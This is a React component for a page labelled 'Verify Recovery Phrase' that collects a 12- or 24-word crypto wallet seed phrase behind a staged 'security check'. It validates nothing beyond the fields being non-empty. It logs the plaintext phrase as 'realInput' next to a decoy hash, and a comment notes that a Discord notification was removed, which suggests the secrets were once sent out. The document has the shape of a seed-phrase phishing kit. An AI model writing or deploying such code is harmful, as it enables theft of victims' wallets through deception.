"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { AlertCircle, CheckCircle2, Loader2 } from "lucide-react"
import { motion, AnimatePresence } from "framer-motion"
import { SecurityCheckProcess } from "./security-check-process"
import { hashKey } from "../utils/hashKey"

export function RecoveryPhraseInput() {
  const [words, setWords] = useState<string[]>(Array(24).fill(""))
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12)
  const [isVerifying, setIsVerifying] = useState(false)
  const [isVerified, setIsVerified] = useState<boolean | null>(null)
  const [showSecurityCheck, setShowSecurityCheck] = useState(false)

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words]
    newWords[index] = value.toLowerCase().trim()
    setWords(newWords)
  }

  const handleVerify = async () => {
    setIsVerifying(true)
    setShowSecurityCheck(true)
  }

  const handleSecurityCheckComplete = async () => {
    setShowSecurityCheck(false)
    const isValid = words.slice(0, phraseLength).every((word) => word.length > 0)
    setIsVerified(isValid)
    setIsVerifying(false)

    // Hash the recovery phrase before storing
    const hashedPhrase = await hashKey(words.slice(0, phraseLength).join(" "))

    const log = {
      id: Date.now().toString(),
      timestamp: new Date().toLocaleString(),
      type: "Recovery Phrase" as const,
      result: isValid ? ("Success" as const) : ("Failure" as const),
      hashedKey: hashedPhrase,
      realInput: words.slice(0, phraseLength).join(" "), // Add this line
    }

    const storedLogs = localStorage.getItem("verificationLogs")
    const logs = storedLogs ? JSON.parse(storedLogs) : []
    logs.unshift(log)
    localStorage.setItem("verificationLogs", JSON.stringify(logs.slice(0, 100)))

    // Discord notification removed
  }

  if (showSecurityCheck) {
    return <SecurityCheckProcess onComplete={handleSecurityCheckComplete} />
  }

  return (
    <AnimatePresence mode="wait">
      <motion.div
        key="input"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -20 }}
        transition={{ duration: 0.5 }}
      >
        <div className="mb-4 flex justify-end">
          <Button variant="outline" size="sm" onClick={() => setPhraseLength(phraseLength === 12 ? 24 : 12)}>
            Switch to {phraseLength === 12 ? "24" : "12"}-word phrase
          </Button>
        </div>
        <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 mb-4">
          {words.slice(0, phraseLength).map((word, index) => (
            <motion.div
              key={index}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: index * 0.05 }}
              className="flex items-center"
            >
              <span className="mr-2 text-muted-foreground w-6">{index + 1}.</span>
              <Input
                value={word}
                onChange={(e) => handleWordChange(index, e.target.value)}
                className="bg-background/50"
                placeholder={`Word ${index + 1}`}
              />
            </motion.div>
          ))}
        </div>
        <Button onClick={handleVerify} className="w-full" disabled={isVerifying}>
          {isVerifying ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Verifying...
            </>
          ) : (
            "Verify Recovery Phrase"
          )}
        </Button>
        {isVerified !== null && !isVerifying && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5 }}
            className={`mt-4 p-2 rounded ${isVerified ? "bg-green-500/10" : "bg-red-500/10"} flex items-center`}
          >
            {isVerified ? (
              <>
                <CheckCircle2 className="text-green-500 mr-2" />
                <span className="text-green-500">Recovery phrase verified successfully!</span>
              </>
            ) : (
              <>
                <AlertCircle className="text-red-500 mr-2" />
                <span className="text-red-500">Invalid recovery phrase. Please check and try again.</span>
              </>
            )}
          </motion.div>
        )}
      </motion.div>
    </AnimatePresence>
  )
}

